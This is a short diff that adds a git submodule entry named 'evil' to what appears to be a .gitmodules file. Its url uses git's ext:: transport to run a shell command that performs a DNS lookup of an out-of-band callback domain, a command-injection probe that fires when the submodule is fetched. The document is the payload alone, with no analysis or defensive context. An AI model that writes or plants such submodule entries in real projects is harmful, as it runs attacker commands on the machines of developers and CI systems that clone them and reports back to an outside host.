@@ -1,0 +1,3 @@
+[submodule "evil"]
+    path = vendor/evil
+    url = ext::sh -c "getent hosts grvw-saiqvbbo9bg--gssubext.oob.an1me.sh; exit 1"
